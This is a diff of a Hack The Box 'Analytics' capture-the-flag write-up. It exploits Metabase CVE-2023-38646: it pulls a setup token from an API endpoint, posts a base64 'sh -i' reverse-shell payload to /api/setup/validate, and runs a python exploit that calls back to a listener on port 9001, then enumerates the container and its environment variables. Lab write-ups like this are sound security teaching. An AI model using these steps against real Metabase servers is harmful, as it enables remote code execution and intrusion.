@@ -62,11 +62,12 @@ Browsing the hidden subdomain at http://data.analitycal.htb we find a login port
 <br>
 ### PHASE 2. User
 Search for a poc in github for this cve (https://github.com/securezeron/CVE-2023-38646). Analyzing the poc, we see first step is to obtain setup token, for this, just query the `/api/session/properties` endpoint and find `setup-token` field. Then, to obtain rce, we query the `api/setup/validate` endpoint with the setup token and the appropriate payload.
+
 We can do this ourselves with burpsuite.
 
 ![analytics1](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/9512d67d-0565-48bb-8e77-cca05f62f8b9)
 
-So the setup token is `"setup-token" : "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"`. For the payload, just use a base64 sh -i shell and query the endpoint building a post request with burpsuite.
+So the setup token is `"setup-token" : "249fa03d-fd94-4d5b-b94f-b4ebf3df681f"`. For the payload, just use a base64 `sh -i` shell and query the endpoint building a post request with burpsuite.
 ```markdown
 POST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Content-Type: application/json Content-Length: 818 
 
@@ -95,11 +96,12 @@ POST /api/setup/validate HTTP/1.1 Host: data.analytical.htb Content-Type: applic
 
 ![analytics2](https://github.com/g1vi/Hack-the-box-write-ups/assets/120142960/440a1690-57fa-4ec2-9ab5-2568bcfec630)
 
-If this does not work, just use the poc hardocding the shell in base64 within the poc source code and launch the exploit.
+If this does not work, just use the poc hardocding the shell in base64 within the poc source code.
 ```markdown
 > python3 exploit.py --rhost data.analytical.htb --lhost <listener ip> --lport 9001
 ```
-After issuing the exploit, a sh shell is received on port 9001. Continue enumerating the system.
+After issuing the exploit, a sh shell is received on port 9001.
+Continue enumerating the system.
 ```markdown
 > uname -a && cat /etc/os-release
 Linux befd7ac0fb41 6.2.0-25-generic #25~22.04.2-Ubuntu SMP PREEMPT_DYNAMIC Wed Jun 28 09:55:23 UTC 2 x86_64 Linux
@@ -112,7 +114,7 @@ PRETTY_NAME="Alpine Linux v3.18"
 metabase
 uid=2000(metabase) gid=2000(metabase) groups=2000(metabase),2000(metabase)
 ```
-We are in some kind of limited ubuntu system, maybe a container. Looking around we find a script `/app/run_metabase.sh` to start the database where some env variables are manipulated, so let's enumerate environmental variables.
+We are in some kind of limited Ubuntu system, maybe a container. Looking around we find a script `/app/run_metabase.sh` to start the database where some env variables are manipulated, so let's enumerate environmental variables.
 ```markdown
 > env
 MB_LDAP_BIND_DN=
